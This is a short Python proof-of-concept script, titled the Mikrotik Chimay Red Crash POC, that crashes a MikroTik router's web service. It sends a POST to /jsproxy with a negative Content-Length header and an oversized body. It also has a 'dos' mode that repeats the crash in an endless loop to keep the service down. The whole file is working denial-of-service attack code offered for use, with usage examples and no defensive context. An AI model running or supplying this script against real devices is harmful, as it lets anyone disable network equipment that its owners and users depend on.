#!/usr/bin/env python3

# Mikrotik Chimay Red Crash POC
# The www executable will be relaunched in 1 or 2 seconds
# Use 'dos' MODE argument to keep it crashing

# Usage CrashPOC.py IP MODE
# Examples:
#   ./CrashPOC.py 192.168.88.1 dos
#   ./CrashPOC.py 192.168.88.1 one

import socket, time, sys

header = """POST /jsproxy HTTP/1.1
Content-Length: -1

"""

body = "A"*4096

def crash(ip):
    try:
        s = socket.socket()
        s.connect((ip, 80))
        s.send(bytes(header + body, "ascii"))
        print("Sent")
        time.sleep(0.5)
        print(s.recv(1024))
    except KeyboardInterrupt:
        sys.exit(1)
    except:
        #print("Error")
        pass

def ddos(ip):
    while True:
        crash(ip)

if __name__ == "__main__":
    if len(sys.argv) == 3:
        if sys.argv[2] == "dos":
            ddos(sys.argv[1])
        else:
            crash(sys.argv[1])
    else:
        print("Usage: ./CrashPOC.py IP MODE")
